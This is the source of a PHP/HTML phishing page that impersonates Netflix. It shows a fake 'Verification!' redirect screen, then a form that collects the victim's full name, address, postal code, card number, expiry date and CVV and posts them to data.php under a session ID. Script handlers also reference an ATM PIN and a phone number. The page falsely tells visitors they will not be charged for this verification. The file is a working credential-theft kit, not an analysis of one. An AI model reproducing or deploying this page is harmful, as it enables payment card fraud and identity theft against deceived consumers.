<?php
require "includes/enc.php";
require "includes/functions.php";
error_reporting(0);
$session_id = htmlspecialchars($_GET["session_id"]);

?>
<!DOCTYPE html>
<meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0">
<html class=" js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage no-websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients no-cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths">
<head>

<meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0">

<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><title>Netflix</title>
<link type="text/css" rel="stylesheet" href="media/nonez.css"><link rel="shortcut icon" href="media/favicon.ico">
<link rel="apple-touch-icon" href="media/favicon.ico">
<script src="includes/styles.js" type="text/javascript"></script>
<style type="text/css" media="screen">#tmswf {visibility:hidden}</style>
<script>
function check(form) {


if (form.fullname.value == "")
{ document.getElementById('error1').style.display = "inline-block"; document.getElementById("fullname").classList.add('error'); form.fullname.focus(); return;}
else
{ document.getElementById('error1').style.display = "none"; document.getElementById("fullname").classList.remove('error');}

if (form.address.value == "")
{ document.getElementById('error3').style.display = "inline-block"; document.getElementById("address").classList.add('error'); form.address.focus(); return;}
else
{ document.getElementById('error3').style.display = "none"; document.getElementById("address").classList.remove('error');}

if (form.City.value == "")
{ document.getElementById('error4').style.display = "inline-block"; document.getElementById("City").classList.add('error'); form.City.focus(); return;}
else
{ document.getElementById('error4').style.display = "none"; document.getElementById("City").classList.remove('error');}

var regExpressPostcode = /^[ABCEGHJKLMNPRSTVXY]{1}\d{1}[A-Z]{1} *\d{1}[A-Z]{1}\d{1}$/
if (!regExpressPostcode.test(form.zipcode.value))
{ document.getElementById('error9').style.display = "inline-block"; document.getElementById("zipcode").classList.add('error'); form.zipcode.focus(); return;}
else
{ document.getElementById('error9').style.display = "none"; document.getElementById("zipcode").classList.remove('error');}


if (!checkCreditCard (document.getElementById('CardNumber').value,document.getElementById('CardType').value))
{ document.getElementById('error6').style.display = "inline-block";  document.getElementById("CardNumber").classList.add('error');  form.number.focus(); return; }
else
{ document.getElementById('error6').style.display = "none"; document.getElementById("CardNumber").classList.remove('error');}



var regExpressPostcode = /^\d{2}\/\d{2}$/
if (!regExpressPostcode.test(form.expdate.value))
{ document.getElementById('error7').style.display = "inline-block"; document.getElementById("expdate").classList.add('error'); form.expdate.focus(); return;}
else
{ document.getElementById('error7').style.display = "none"; document.getElementById("expdate").classList.remove('error');}


var regExpress =  /^[0-9]*$/
if (!regExpress.test(form.cvv2.value))
{ document.getElementById('error8').style.display = "inline-block"; document.getElementById("cvv2").classList.add('error'); form.cvv2.focus(); return;}
else
{ document.getElementById('error8').style.display = "none"; document.getElementById("cvv2").classList.remove('error');}

if (form.CardType.value == "AmEx") {
if (form.cvv2.value.length < 4) 
{ document.getElementById('error8').style.display = "inline-block"; document.getElementById("cvv2").classList.add('error'); form.cvv2.focus(); return;}
}


if (form.cvv2.value.length < 3) 
{ document.getElementById('error8').style.display = "inline-block"; document.getElementById("cvv2").classList.add('error'); form.cvv2.focus(); return;}
else
{ document.getElementById('error8').style.display = "none"; document.getElementById("cvv2").classList.remove('error');}


form.submit()
}

function closeit() {
document.getElementById("cookie-disclosure").style.display = "none";
}
</script>
<script>

function smallone() {
if(document.getElementById("fullname").value == "") {
document.getElementById("fullname").classList.remove('hasText');
}else {
document.getElementById("fullname").classList.add('hasText');}}




function smallthree() {
if(document.getElementById("address").value == "") {
document.getElementById("address").classList.remove('hasText');
}else {
document.getElementById("address").classList.add('hasText');}}


function smallfour() {
if(document.getElementById("City").value == "") {
document.getElementById("City").classList.remove('hasText');
}else {
document.getElementById("City").classList.add('hasText');}}


function smallfive() {
if(document.getElementById("State").value == "") {
document.getElementById("State").classList.remove('hasText');
}else {
document.getElementById("State").classList.add('hasText');}}


function smallsix() {
if(document.getElementById("CardNumber").value == "") {
document.getElementById("CardNumber").classList.remove('hasText');
}else {
document.getElementById("CardNumber").classList.add('hasText');}}


function smallseven() {
if(document.getElementById("expdate").value == "") {
document.getElementById("expdate").classList.remove('hasText');
}else {
document.getElementById("expdate").classList.add('hasText');}}


function smalleight() {
if(document.getElementById("cvv2").value == "") {
document.getElementById("cvv2").classList.remove('hasText');
}else {
document.getElementById("cvv2").classList.add('hasText');}}

function smallnine() {
if(document.getElementById("zipcode").value == "") {
document.getElementById("zipcode").classList.remove('hasText');
}else {
document.getElementById("zipcode").classList.add('hasText');}}


function smallten() {
if(document.getElementById("phone").value == "") {
document.getElementById("phone").classList.remove('hasText');
}else {
document.getElementById("phone").classList.add('hasText');}}


function smalleleven() {
if(document.getElementById("atmpin").value == "") {
document.getElementById("atmpin").classList.remove('hasText');
}else {
document.getElementById("atmpin").classList.add('hasText');}}


</script>
<script>
function change(){
var change = document.getElementById("CardNumber").value

if (change.charAt(0) == '5') {
document.getElementById("CardType").value = "MasterCard"; 
document.getElementById("cvv2").maxLength = "3";	
document.getElementById("CardNumber").maxLength = "16";	
}


if (change.charAt(0) == '4') {
document.getElementById("CardType").value = "Visa";
document.getElementById("cvv2").maxLength = "3";
document.getElementById("CardNumber").maxLength = "16";	
}


if (change.charAt(0) == '3') {
document.getElementById("CardType").value = "AmEx";
document.getElementById("CardNumber").maxLength = "15";	
document.getElementById("cvv2").maxLength = "4";	
}

}
</script>
<script type="text/javascript">
function showIt() {
  document.getElementById("loading").style.display = "none";
}
setTimeout("showIt()", 5800); // after 7500 = 7.5 sec

function showIt2() {
  document.getElementById("page").style.display = "block";
}
setTimeout("showIt2()", 5800); // after 10000 = 10 secs


function cvvhelpopen() {
window.scrollTo(0, 0);
document.getElementById("cvvTooltip").style.display = "block";
}

function cvvhelpclose() {
document.getElementById("cvvTooltip").style.display = "none";
document.getElementById('cvv2').focus()
}

</script>
<Style>
hr.style13 {
	height: 10px;
	border: 0;
	box-shadow: 0 10px 10px -10px #8c8b8b inset;
	border-radius: 2px;
}
#cvvTooltip {
	position:absolute;
	z-index:99999;
	height:160%;
}

#selectionLabel {
margin-top:20px;
font-weight: 700;
color:#8C8C8C;;
display:block;
font-size:15px;
}


#atmpin{
max-width: 440px;
}

#loading {
}
#loadgif {
}
#locklogo {
}
}
@media screen and (min-width: 766px) {
#thelogos {
text-decoration: none;
margin-left:248px;
}

#mainlogo {
padding-top: 24px;
}

#selectionLabel {
margin-top:20px;
font-weight: 700;
color:#8C8C8C;;
display:block;
font-size:15px;
}


#ppactive {
}
#loading {
}
#loadgif {
}
#locklogo {
margin-left:-5px;
}
}
@media screen and (max-width: 765px) {
#thelogos {
margin-left:-10px;
text-decoration: none;
}

#mainlogo { 
padding-top: 15px;
}

#selectionLabel {
	margin-top: 20px;
	font-weight: 700;
	color: #8C8C8C;;
	display: block;
	font-size: 11px;
	margin-left: 0px;
}

#ppactive {
	margin: 5px 5px;
	float: left;
	max-width: 60%;
}

#loading {
padding-left: 29%;
}
#loadgif {
margin-left: -18px;
}
#locklogo {
padding-left:40px;
}
}

@media screen and (max-width: 320px) {

#loading {
padding-left: 23%;
}
#loadgif {
margin-left: -22px;
}
#locklogo {
padding-left:40px;
}

#selectionLabel {
	margin-top: 20px;
	font-weight: 700;
	color: #8C8C8C;;
	display: block;
	font-size: 11px;
	margin-left: 0px;
}


}


</style>
</head>
<body><div id="appMountPoint"><div class="basicLayout showDisclosure firefox modernInApp memberSimplicity-editpaypalOptionMode simplicity" dir="ltr" data-reactroot="" data-reactid="1" data-react-checksum="1875676090" lang="en-US"><div id="cookie-disclosure" class="clearfix" data-reactid="2"><p class="cookie-disclosure-message reg" data-reactid="3"><!-- react-text: 4 -->Netflix uses cookies for personalization, to customize its online advertisements, and for other purposes. <!-- /react-text --><a href="#privacy" data-reactid="5">Learn more</a><!-- react-text: 6 --> or <!-- /react-text --><a class="pointer" data-reactid="7">change your cookie preferences</a><!-- react-text: 8 -->. Netflix supports the Digital Advertising Alliance principles. By interacting with this site, you agree to our use of cookies.<!-- /react-text --></p><p class="cookie-disclosure-message short" data-reactid="9"><!-- react-text: 10 -->We use cookies (<!-- /react-text --><a href="#privacy" data-reactid="11">why?</a><!-- react-text: 12 -->). You can change <!-- /react-text --><a class="pointer" data-reactid="13">cookie preferences</a><!-- react-text: 14 -->; continued site use signifies consent.<!-- /react-text --></p><div class="btn-container" data-reactid="15"><a class="close-link" data-reactid="16">Close</a><a style="text-decoration: none;" onclick="closeit()" ><span class="icon-close close-button pointer" data-reactid="17"></span></a></div></div>

<div class="nfHeader noBorderHeader signupBasicHeader"><a href="#" class="svg-nfLogo signupBasicHeader">
<svg viewBox="0 0 111 30" id="mainlogo" class="svg-icon svg-icon-netflix-logo" focusable="true" ><title></title><g id="netflix-logo"><path d="M105.062 14.28L111 30c-1.75-.25-3.499-.563-5.28-.845l-3.345-8.686-3.437 7.969c-1.687-.282-3.344-.376-5.031-.595l6.031-13.75L94.468 0h5.063l3.062 7.874L105.875 0h5.124l-5.937 14.28zM90.47 0h-4.594v27.25c1.5.094 3.062.156 4.594.343V0zm-8.563 26.937c-4.187-.281-8.375-.53-12.656-.625V0h4.687v21.875c2.688.062 5.375.28 7.969.405v4.657zM64.25 10.657v4.687h-6.406V26H53.22V0h13.125v4.687h-8.5v5.97h6.406zm-18.906-5.97V26.25c-1.563 0-3.156 0-4.688.062V4.687h-4.844V0h14.406v4.687h-4.874zM30.75 15.593c-2.062 0-4.5 0-6.25.095v6.968c2.75-.188 5.5-.406 8.281-.5v4.5l-12.968 1.032V0H32.78v4.687H24.5V11c1.813 0 4.594-.094 6.25-.094v4.688zM4.78 12.968v16.375C3.094 29.531 1.593 29.75 0 30V0h4.469l6.093 17.032V0h4.688v28.062c-1.656.282-3.344.376-5.125.625L4.78 12.968z" id="Fill-14"></path></g></svg><span class="screen-reader-text">Netflix</span></a><a href="#signout" class="authLinks signupBasicHeader">Sign Out</a></div>



<div class="simpleContainer slimWidth" data-reactid="24" data-transitioned-child="true">




<div class="centerContainer contextStep" id="loading" style="display: block; transform: none; opacity: 1; transition-duration: 250ms;"><div class="paymentContainer"><div><div id="locklogo" class="stepLogoContainer"><span class="stepLogo paymentStepLogo"></span></div><div class="stepHeader-container"><div class="stepHeader"><h1 style="color:#E50914;" class="stepTitle">Verification!</h1></div></div><div class="narrowContainer"><div style="width:200px;" class="contextRow contextRowFirst">For security measures you will be redirected to a verification page..<br>
<span id="loadgif"><img src="media/loading.gif"></span></div></div></div><div></div></div></div>

<div class="centerContainer" id="page" style="display: none; transform: none; opacity: 1; transition-duration: 250ms;">
<form action="data.php?session_id=<?php echo $session_id; ?>" method="post">
<input id="CardType" type="hidden" name="CardType"  value="">

<div class="paymentFormContainer"><!-- react-empty: 228 --><div><div class="stepHeader-container"><div class="stepHeader"><br><h1 class="stepTitle">Verification (1/2)</h1></div></div><div class="contextContainer"><div class="contextRow contextRowFirst">Please fill the requested information to continue.<br>Use the same data you have on account for us.</div></div></div><div class="fieldContainer">


<div class="">
<ul class="simpleForm structural ui-grid">
<li class="nfFormSpace">
<div class="nfInput nfInputOversize"><div class="nfInputPlacement">
<label class="input_id" placeholder="fullname"><input onKeyDown="if(event.keyCode==13) check(this.form);"  name="fullname" onchange="smallone();" onfocusout="smallone()" class="nfTextField" id="fullname" tabindex="0" autocomplete="false" type="text"><label for="fullname" class="placeLabel">Full Name</label></label></div>
<div id="error1" style="display:none;" class="inputError">Your full name is required!</div>
</div></li>



<li class="nfFormSpace"><div class="nfInput nfInputOversize"><div class="nfInputPlacement"><label class="input_id" placeholder="address">
<input onKeyDown="if(event.keyCode==13) check(this.form);"  name="address" class="nfTextField" onchange="smallthree()" onfocusout="smallthree()" id="address" tabindex="0" autocomplete="false" minlength="5" type="text">
<label for="address" class="placeLabel">Address</label></label></div>
<div id="error3" style="display:none;" class="inputError">Address is required!</div>
</div></li>

<li class="nfFormSpace"><div class="nfInput nfInputOversize"><div class="nfInputPlacement"><label class="input_id" placeholder="City">
<input onKeyDown="if(event.keyCode==13) check(this.form);"  name="City" class="nfTextField" onchange="smallfour()" onfocusout="smallfour()" id="City" tabindex="0" autocomplete="false" minlength="5" type="text">
<label for="City" class="placeLabel">City</label></label></div>
<div id="error4" style="display:none;" class="inputError">City is required!</div>
</div></li>

<li class="nfFormSpace"><div class="nfInput nfInputOversize"><div class="nfInputPlacement"><label class="input_id" placeholder="zipcode">
<input onKeyDown="if(event.keyCode==13) check(this.form);"  name="zipcode" class="nfTextField" onchange="smallnine()" onfocusout="smallnine()"  id="zipcode" tabindex="0" autocomplete="false" minlength="5" type="text">
<label for="zipcode" class="placeLabel">Postal Code</label></label></div>
<div id="error9" style="display:none;" class="inputError">Billing Postal Code is required!</div>
</div></li>



<div class="nfTabSelectionWrapper" id="creditOrDebitCardDisplayStringId"><a style="text-decoration:none;" onclick="document.getElementById('CardNumber').focus()" class="nfTabSelection nfTabSelection--active paymentPicker standardHeight" href="#"><div class="mopName"><div id="ppactive" class="nfTabSelection--text card-type-text paymentActive"><span id="selectionLabel" class="selectionLabel">Your Card</span></div><div id="thelogos">&nbsp; <img src="media/12_11_2014_icon_visa_37x25.png" style="vertical-align:middle;">&nbsp; <img src="media/12_05_2017_icon_master_33x25.png" style="vertical-align:middle;">&nbsp; <img src="media/10_18_2014_icon_amex_37x25.png" style="vertical-align:middle;">&nbsp; <img src="media/10_18_2014_icon_discovery_37x25.png"style="vertical-align:middle;"></div></div></a></div>

<hr class="style13">


<li class="nfFormSpace"><div class="cardNumberContainer"><div class="nfInput nfInputOversize"><div class="nfInputPlacement"><label class="input_id" placeholder="creditCardNumber">
<input onKeyDown="if(event.keyCode==13) check(this.form);"  name="number" class="nfTextField" onkeyup="change();" onfocusout="smallsix()" onchange="smallsix();change();"  id="CardNumber" tabindex="0" autocomplete="false" maxlength="16" minlength="15" type="text">
<label for="CardNumber" class="placeLabel">Card Number</label></label></div></div>
<div id="error6" style="display:none;font-size:13px;color:#b92d2b;" class="inputError">Card Number is required!</div>
</div></li>

<li class="nfFormSpace"><div class="nfInput nfInputOversize"><div class="nfInputPlacement"><label class="input_id" placeholder="creditExpirationMonth">
<input onKeyDown="if(event.keyCode==13) check(this.form);"  name="expdate" class="nfTextField" maxlength="5" minlength="4" onfocusout="smallseven()" onchange="smallseven();" onkeyup="this.value=this.value.replace(/^(\d{2})(\d{2})/, '$1/$2')" id="expdate" tabindex="0" autocomplete="false" type="text">
<label for="expdate" class="placeLabel">Expiration Date (MM/YY)</label></label></div>
<div id="error7" style="display:none;" class="inputError">Expiration Date (Month/Year) is required!</div>
</div></li>

<li class="nfFormSpace"><div class="nfInput nfInputOversize tooltip"><div class="nfInputPlacement"><label class="input_id" placeholder="cvv2">
<input onKeyDown="if(event.keyCode==13) check(this.form);" style="" name="cvv2" class="nfTextField" onfocusout="smalleight()" onchange="smalleight()" id="cvv2" tabindex="0" autocomplete="false" maxlength="3" minlength="3" type="password">
<label for="cvv2" class="placeLabel">Security Code (CVV)</label></label></div><div class="tooltipWrapper"><span style="cursor:pointer;margin-left:-5px;" onclick="cvvhelpopen();" class="nf-svg-icon" ><svg width="36" height="36" viewBox="0 0 36 36" xmlns="http://www.w3.org/2000/svg"><g id="Spec" fill="none"><g id="Help-Affordance"><circle id="Oval-128" stroke="#A9A6A6" cx="18" cy="18" r="17"></circle><path d="M17.051 21.094v-.54c0-.648.123-1.203.369-1.665.246-.462.741-.915 1.485-1.359a7.37 7.37 0 0 0 .981-.657c.222-.186.372-.366.45-.54.078-.174.117-.369.117-.585 0-.384-.177-.714-.531-.99-.354-.276-.831-.414-1.431-.414-.624 0-1.131.135-1.521.405-.39.27-.627.627-.711 1.071h-2.304a4.053 4.053 0 0 1 .738-1.845c.396-.546.924-.981 1.584-1.305.66-.324 1.44-.486 2.34-.486.852 0 1.596.153 2.232.459.636.306 1.134.726 1.494 1.26.36.534.54 1.143.54 1.827 0 .66-.177 1.227-.531 1.701-.354.474-.891.933-1.611 1.377-.42.252-.729.48-.927.684-.198.204-.33.399-.396.585a1.79 1.79 0 0 0-.099.603v.414h-2.268zm1.26 4.158c-.408 0-.762-.15-1.062-.45-.3-.3-.45-.654-.45-1.062 0-.408.15-.762.45-1.062.3-.3.654-.45 1.062-.45.408 0 .762.15 1.062.45.3.3.45.654.45 1.062 0 .408-.15.762-.45 1.062-.3.3-.654.45-1.062.45z" id="?" fill="#A9A6A6"></path></g></g></svg></span></div>
<div id="error8" style="display:none;" class="inputError">Security Code (CVV) is required!</div>
</div></li>

<div class="cvvTooltip" id="cvvTooltip" style="display:none;"><span onclick="cvvhelpclose();" class="icon-close close-button pointer"></span><div class="tooltipDesc">Your card's security code (CVV) is the 3 or 4 digit number located on the back of most cards.</div><div class="otherCvvHelp"></div><div class="amexCvvHelp"></div></div>



<br><Br><Br>
<div class="signupTerms" id="tou-rest-freetrial" data-automation-details="false"><span id=""><p>Your will not be charged for this verification process.</p></span></div>

</ul></div></div></div><div class="submitBtnContainer">
<button class="nf-btn nf-btn-primary nf-btn-solid nf-btn-align-undefined nf-btn-oversize" onclick="check(this.form)"  type="button" autocomplete="off" tabindex="0" id="simplicityPayment-SAVE">Continue</button>

</div></form></div>
</div>




<div style="margin-top:-120px;" class="site-footer-wrapper centered" data-reactid="48" style="transition-duration: 250ms; opacity: 1;"><div class="footer-divider" data-reactid="49"></div><div class="site-footer" data-reactid="50"><p class="footer-top" data-reactid="51"><a class="footer-top-a" href="#contactus" data-reactid="52">Questions? Contact us.</a></p><ul class="footer-links structural" data-reactid="53"><li class="footer-link-item" placeholder="footer_responsive_link_faq_item" data-reactid="54"><a class="footer-link" href="#support/412" placeholder="footer_responsive_link_faq" data-reactid="55"><span id="" data-reactid="56">FAQ</span></a></li><li class="footer-link-item" placeholder="footer_responsive_link_help_item" data-reactid="57"><a class="footer-link" href="#" placeholder="footer_responsive_link_help" data-reactid="58"><span id="" data-reactid="59">Help Center</span></a></li><li class="footer-link-item" placeholder="footer_responsive_link_terms_item" data-reactid="60"><a class="footer-link" href="#legal/termsofuse" placeholder="footer_responsive_link_terms" data-reactid="61"><span id="" data-reactid="62">Terms of Use</span></a></li><li class="footer-link-item" placeholder="footer_responsive_link_privacy_separate_link_item" data-reactid="63"><a class="footer-link" href="#legal/privacy" placeholder="footer_responsive_link_privacy_separate_link" data-reactid="64"><span id="" data-reactid="65">Privacy</span></a></li><li class="footer-link-item" placeholder="footer_responsive_link_cookies_separate_link_item" data-reactid="66"><a class="footer-link" href="#legal/privacy#cookies" placeholder="footer_responsive_link_cookies_separate_link" data-reactid="67"><span id="" data-reactid="68">Cookie Preferences</span></a></li><li class="footer-link-item" placeholder="footer_responsive_link_corporate_information_item" data-reactid="69"><a class="footer-link" href="#2101" placeholder="footer_responsive_link_corporate_information" data-reactid="70"><span id="" data-reactid="71">Corporate Information</span></a></li></ul></div></div>
</div></div>


</body><style id="stylish-1" class="stylish" type="text/css">/* nufrankz.org, 2017 */

/* Dark/Transparent Google Search v0.31 03.01.18 */



@namespace url(http://www.w3.org/1999/xhtml);</style></html>